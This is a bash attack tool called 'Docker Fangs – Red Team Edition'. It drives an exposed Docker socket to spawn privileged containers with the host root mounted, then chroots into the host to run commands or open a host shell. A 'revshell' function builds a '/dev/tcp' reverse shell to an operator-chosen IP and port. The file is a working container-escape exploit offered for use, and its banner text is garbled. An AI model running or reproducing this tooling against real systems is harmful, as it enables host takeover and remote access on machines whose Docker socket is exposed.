#!/usr/bin/env bash
# ============================================================
#   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
#   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•
#   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
#   â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â•šâ•â•â•â•â–ˆâ–ˆâ•‘
#   â–ˆâ–ˆâ•‘     â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘
#   â•šâ•â•      â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•
#
#                DOCKER FANGS â€“ RED TEAM EDITION
#        Privileged Container Command Execution & Host Escape
# ============================================================

set -eu

# Colors
RED="\033[1;31m"
GRN="\033[1;32m"
YEL="\033[1;33m"
CYN="\033[1;36m"
RST="\033[0m"

SOCK="/var/run/docker.sock"
CURL="curl -s --unix-socket $SOCK"
TIMEOUT="--max-time 10"
BASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
SOCAT=$BASE_DIR/modules/bin/socat
check_docker_socket() {
    [ -S "$SOCK" ] || { echo -e "${RED}[ERR] No docker socket at $SOCK${RST}"; exit 1; }
}

extract_id() {
    echo "$1" | awk -F'"' '/"Id":/ {print $4; exit}'
}

shortid() { echo "$1" | cut -c1-12; }

api_post() {
    path="$1"
    payload="${2:-}"
    if [ -n "$payload" ]; then
        $CURL $TIMEOUT -H "Content-Type: application/json" -d "$payload" -X POST "http://docker$path"
    else
        $CURL $TIMEOUT -X POST "http://docker$path"
    fi
}

api_get() {
    $CURL $TIMEOUT "http://docker$1"
}

api_delete() {
    $CURL $TIMEOUT -X DELETE "http://docker$1"
}

################################################################################
# PULL IMAGE
################################################################################
cmd_pull() {
    image="$1"
    [ -z "$image" ] && { echo -e "${RED}[ERR] No image specified${RST}"; return 1; }
    
    echo -e "${YEL}[*] Pulling image: $image${RST}"
    
    # Pull image
    resp=$(api_post "/images/create?fromImage=$image")
    
    if echo "$resp" | grep -q "error"; then
        echo -e "${RED}[ERR] Failed to pull image: $image${RST}"
        echo "$resp"
        return 1
    else
        echo -e "${GRN}[+] Successfully pulled image: $image${RST}"
        return 0
    fi
}

################################################################################
# LIST IMAGES
################################################################################
cmd_images() {
    echo -e "${CYN}=== IMAGES ===${RST}"
    raw=$(api_get '/images/json')
    
    echo "$raw" | tr ',' '\n' | grep -E '"RepoTags"|"Id"' | while read -r line; do
        if echo "$line" | grep -q '"RepoTags"'; then
            tags=$(echo "$line" | sed 's/.*\[\([^]]*\)\].*/\1/' | tr -d '"')
            echo "Tags: $tags"
        elif echo "$line" | grep -q '"Id"'; then
            id=$(echo "$line" | awk -F'"' '{print $4}' | cut -d: -f2 | cut -c1-12)
            echo "ID: $id"
            echo "---"
        fi
    done
}

################################################################################
# CREATE CONTAINER
################################################################################
cmd_create() {
    image="${1:-alpine:latest}"
    shift
    command="${*:-/bin/sh}"
    
    echo -e "${YEL}[*] Creating container from image: $image${RST}"
    echo -e "${YEL}[*] Command: $command${RST}"

    # Build command array
    CMD_JSON="["
    for tok in $command; do
        tok=$(printf '%s' "$tok" | sed 's/"/\\"/g')
        CMD_JSON="${CMD_JSON}\"$tok\","
    done
    CMD_JSON="${CMD_JSON%,}]"

    # Create container
    payload="{\"Image\":\"$image\",\"Cmd\":$CMD_JSON,\"Tty\":true,\"OpenStdin\":true}"
    resp=$(api_post "/containers/create" "$payload")
    cid=$(extract_id "$resp")
    
    if [ -z "$cid" ]; then
        echo -e "${RED}[ERR] Failed to create container${RST}"
        echo "Response: $resp"
        return 1
    fi

    cid_short=$(shortid "$cid")
    echo -e "${GRN}[+] Container created: $cid_short${RST}"
    
    # Start container
    api_post "/containers/$cid/start" >/dev/null
    echo -e "${GRN}[+] Container started${RST}"
    
    echo "$cid_short"
}

################################################################################
# INTERACTIVE SHELL
################################################################################
cmd_shell() {
    container="$1"
    
    echo -e "${YEL}[*] Starting interactive shell in container: $container${RST}"
    echo -e "${YEL}[!] Press Ctrl+D or type 'exit' to quit${RST}"
    
    # Create exec instance for interactive shell
    payload='{"AttachStdin":true,"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/sh"]}'
    resp=$(api_post "/containers/$container/exec" "$payload")
    execid=$(extract_id "$resp")
    
    if [ -z "$execid" ]; then
        echo -e "${RED}[ERR] Failed to create exec instance${RST}"
        return 1
    fi

    echo -e "${GRN}[+] Exec instance created: $execid${RST}"
    
    # Use socat for better TTY if available
    if [ -x "$SOCAT" ]; then
        echo -e "${GRN}[+] Using socat for interactive TTY${RST}"
        $SOCAT - EXEC:"$CURL -X POST -H \\\"Content-Type: application/json\\\" -d '{\\\"Detach\\\":false,\\\"Tty\\\":true}' http://docker/exec/$execid/start" 2>/dev/null
    else
        echo -e "${YEL}[!] Using raw curl for shell (TTY may be limited)${RST}"
        api_post "/exec/$execid/start" '{"Detach":false,"Tty":true}'
    fi
}

################################################################################
# CREATE AND SHELL - One command to create and get shell
################################################################################
cmd_create_shell() {
    image="${1:-alpine:latest}"
    
    echo -e "${YEL}[*] Creating container and starting interactive shell...${RST}"
    
    # Create container
    cid_short=$(cmd_create "$image")
    [ $? -ne 0 ] && return 1
    
    # Start interactive shell
    cmd_shell "$cid_short"
    
    # Cleanup after shell exits
    echo -e "${YEL}[*] Cleaning up container $cid_short...${RST}"
    api_delete "/containers/$cid_short?force=true" >/dev/null
    echo -e "${GRN}[+] Container cleaned up${RST}"
}

################################################################################
# COMMAND EXECUTION IN PRIVILEGED CONTAINER
################################################################################
cmd_exec() {
    container="$1"
    shift
    command="$*"

    [ -z "$command" ] && { echo -e "${RED}[ERR] No command provided${RST}"; return 1; }

    echo -e "${YEL}[*] Executing in container $container: $command${RST}"

    # Build command array
    CMD_JSON="["
    for tok in "$@"; do
        tok=$(printf '%s' "$tok" | sed 's/"/\\"/g')
        CMD_JSON="${CMD_JSON}\"$tok\","
    done
    CMD_JSON="${CMD_JSON%,}]"

    # Create exec instance
    payload="{\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":false,\"Cmd\":$CMD_JSON}"
    resp=$(api_post "/containers/$container/exec" "$payload")
    execid=$(extract_id "$resp")

    if [ -z "$execid" ]; then
        echo -e "${RED}[ERR] Failed to create exec instance${RST}"
        return 1
    fi

    # Execute and capture output with exit code
    echo -e "${GRN}[+] Executing command...${RST}"
    echo "----------------------------------------"
    
    # Start exec and capture output
    output=$(api_post "/exec/$execid/start" '{"Detach":false,"Tty":false}')
    echo "$output"
    
    # Get exit code
    inspect=$(api_get "/exec/$execid/json")
    exit_code=$(echo "$inspect" | grep -o '"ExitCode":[0-9]*' | cut -d: -f2)
    
    echo "----------------------------------------"
    if [ "$exit_code" = "0" ]; then
        echo -e "${GRN}[+] Command completed successfully (exit code: $exit_code)${RST}"
    else
        echo -e "${RED}[!] Command failed (exit code: $exit_code)${RST}"
    fi
    
    return $exit_code
}

################################################################################
# HOST ESCAPE VIA MOUNT
################################################################################
cmd_mount_host() {
    command="$*"
    
    echo -e "${YEL}[*] Creating privileged container with host mount...${RST}"

    # Create container with host mount
    payload='{
        "Image":"debian:stable-slim",
        "Cmd":["/bin/bash","-c","sleep 3600"],
        "HostConfig":{
            "Binds":["/:/host:rw"],
            "Privileged":true
        }
    }'

    resp=$(api_post "/containers/create" "$payload")
    cid=$(extract_id "$resp")
    
    if [ -z "$cid" ]; then
        echo -e "${RED}[ERR] Failed to create container${RST}"
        return 1
    fi

    cid_short=$(shortid "$cid")
    echo -e "${GRN}[+] Container created: $cid_short${RST}"

    # Start container
    api_post "/containers/$cid/start" >/dev/null
    echo -e "${GRN}[+] Container started${RST}"

    # If command provided, execute it on host
    if [ -n "$command" ]; then
        echo -e "${YEL}[*] Executing on host: $command${RST}"
        
        # Escape command for host execution
        host_cmd="chroot /host /bin/sh -c '$command'"
        
        CMD_JSON="[\"/bin/sh\", \"-c\", \"$host_cmd\"]"
        payload="{\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":false,\"Cmd\":$CMD_JSON}"
        
        resp=$(api_post "/containers/$cid/exec" "$payload")
        execid=$(extract_id "$resp")
        
        if [ -z "$execid" ]; then
            echo -e "${RED}[ERR] Failed to create exec instance${RST}"
        else
            echo -e "${GRN}[+] Executing command on HOST...${RST}"
            echo "----------------------------------------"
            output=$(api_post "/exec/$execid/start" '{"Detach":false,"Tty":false}')
            echo "$output"
            
            # Get exit code
            inspect=$(api_get "/exec/$execid/json")
            exit_code=$(echo "$inspect" | grep -o '"ExitCode":[0-9]*' | cut -d: -f2)
            
            echo "----------------------------------------"
            if [ "$exit_code" = "0" ]; then
                echo -e "${GRN}[+] Host command completed (exit code: $exit_code)${RST}"
            else
                echo -e "${RED}[!] Host command failed (exit code: $exit_code)${RST}"
            fi
        fi
    else
        # Interactive shell fallback
        echo -e "${YEL}[*] Starting interactive host shell...${RST}"
        echo -e "${YEL}[!] Press Ctrl+D to exit and cleanup${RST}"
        
        payload="{\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"Cmd\":[\"/bin/sh\", \"-c\", \"chroot /host /bin/sh\"]}"
        resp=$(api_post "/containers/$cid/exec" "$payload")
        execid=$(extract_id "$resp")
        
        # Use socat for better TTY if available
        if [ -x "$SOCAT" ]; then
            $SOCAT - EXEC:"$CURL -X POST -H \\\"Content-Type: application/json\\\" -d '{\\\"Detach\\\":false,\\\"Tty\\\":true}' http://docker/exec/$execid/start" 2>/dev/null
        else
            api_post "/exec/$execid/start" '{"Detach":false,"Tty":true}'
        fi
    fi

    # Cleanup
    echo -e "${YEL}[*] Cleaning up container...${RST}"
    api_delete "/containers/$cid?force=true" >/dev/null
    echo -e "${GRN}[+] Cleanup completed${RST}"
}

################################################################################
# LIST CONTAINERS
################################################################################
cmd_list() {
    echo -e "${CYN}=== CONTAINERS ===${RST}"
    raw=$(api_get '/containers/json?all=true')
    
    echo "$raw" | tr '{' '\n' | grep '"Id"' | while read -r block; do
        id=$(echo "$block" | awk -F'"' '/"Id":/ {print $4}')
        name=$(echo "$block" | grep -o '"Names":[^]]*' | sed -E 's/.*"\/?([^"]+)".*/\1/')
        img=$(echo "$block" | awk -F'"' '/"Image":/ {print $4}')
        st=$(echo "$block" | awk -F'"' '/"State":/ {print $4}')

        [ -n "$id" ] && printf "%s\t%s\t%s\t%s\n" "$(shortid "$id")" "$name" "$img" "$st"
    done
}

################################################################################
# PRIVILEGED DETECTION
################################################################################
cmd_detect_priv() {
    echo -e "${CYN}=== PRIVILEGED CONTAINER DETECTION ===${RST}"
    
    privileged=false
    
    # Check capabilities
    if grep -q "CapEff:\s*0000003fffffffff" /proc/self/status 2>/dev/null; then
        privileged=true
        echo -e "${GRN}[+] All capabilities enabled${RST}"
    else
        echo -e "${RED}[-] Limited capabilities${RST}"
    fi
    
    # Check host devices
    if [ -b /dev/sda ] || [ -c /dev/mem ]; then
        privileged=true
        echo -e "${GRN}[+] Host devices accessible${RST}"
    else
        echo -e "${RED}[-] No host device access${RST}"
    fi
    
    # Check PID namespace
    if [ "$(readlink /proc/1/ns/pid 2>/dev/null)" = "$(readlink /proc/self/ns/pid 2>/dev/null)" ]; then
        privileged=true
        echo -e "${GRN}[+] Sharing PID namespace with host${RST}"
    else
        echo -e "${RED}[-] Isolated PID namespace${RST}"
    fi
    
    echo ""
    if $privileged; then
        echo -e "${GRN}ðŸš¨ PRIVILEGED CONTAINER DETECTED!${RST}"
        return 0
    else
        echo -e "${RED}âœ… No privileged container detected${RST}"
        return 1
    fi
}

################################################################################
# QUICK HOST COMMAND EXECUTION
################################################################################
revshell() {
    IP="$1"
    PORT="$2"

    # Validate arguments
    if [ -z "$IP" ] || [ -z "$PORT" ]; then
        echo -e "${RED}[ERR] Usage: revshell <IP> <PORT>${RST}"
        return 1
    fi

    # Build reverse shell command
    command="sh -i >/dev/tcp/$IP/$PORT 0<&1"

    echo -e "${YEL}[*] Launching reverse shell to $IP:$PORT via host mount...${RST}"
    cmd_mount_host "$command"
}


################################################################################
# HELP
################################################################################
helpmsg() {
    cat <<EOF
${CYN}Docker Fangs - Privileged Container Exploitation${RST}

Usage:
  list                           List all containers
  images                         List all available images
  pull <image>                   Pull Docker image
  create [image] [cmd]           Create new container
  shell <container>              Interactive shell in container
  run [image] [cmd]             Create container and get shell (auto-cleanup)
  exec <container> <command>     Execute command in container
  host <command>                Execute command on host via mount escape
  mount-host [command]          Escape to host (with optional command)
  detect-priv                   Check if container is privileged

Examples:
  $(basename "$0") list
  $(basename "$0") images
  $(basename "$0") pull ubuntu:latest
  $(basename "$0") create alpine:latest
  $(basename "$0") shell my-container
  $(basename "$0") run ubuntu:latest
  $(basename "$0") exec my-container "id && ls /"
  $(basename "$0") host "cat /etc/hostname"
  $(basename "$0") mount-host "whoami && pwd"

Popular Images:
  alpine:latest, ubuntu:latest, debian:latest, centos:latest, busybox:latest

EOF
}

################################################################################
# MAIN
################################################################################
check_docker_socket

if [ $# -eq 0 ]; then
    helpmsg
    exit 0
fi

cmd="$1"
shift

case "$cmd" in
    list|ps)
        cmd_list
        ;;
    images|list-images)
        cmd_images
        ;;
    pull)
        if [ $# -eq 0 ]; then
            echo -e "${RED}Usage: pull <image>${RST}"
            echo -e "${YEL}Examples:${RST}"
            echo -e "  pull alpine:latest"
            echo -e "  pull ubuntu:20.04"
            echo -e "  pull nginx:latest"
            exit 1
        fi
        cmd_pull "$1"
        ;;
    create)
        cmd_create "$@"
        ;;
    shell|interactive)
        if [ $# -eq 0 ]; then
            echo -e "${RED}Usage: shell <container>${RST}"
            exit 1
        fi
        cmd_shell "$1"
        ;;
    run|create-shell)
        cmd_create_shell "${1:-alpine:latest}"
        ;;
    exec)
        if [ $# -lt 2 ]; then
            echo -e "${RED}Usage: exec <container> <command>${RST}"
            exit 1
        fi
        container="$1"
        shift
        cmd_exec "$container" "$@"
        ;;
    host|host-exec)
        if [ $# -eq 0 ]; then
            echo -e "${RED}Usage: host <command>${RST}"
            exit 1
        fi
        cmd_mount_host "$@"
        ;;
    revshell|shell)
        if [ $# -ne 2 ]; then
            echo -e "${RED}[ERR] Usage: revshell <IP> <PORT>${RST}"
            exit 1
        fi
        revshell "$1" "$2"
        ;;
    detect-priv|privileged)
        cmd_detect_priv
        ;;
    help|-h|--help)
        helpmsg
        ;;
    *)
        echo -e "${RED}[ERR] Unknown command: $cmd${RST}"
        helpmsg
        exit 1
        ;;
esac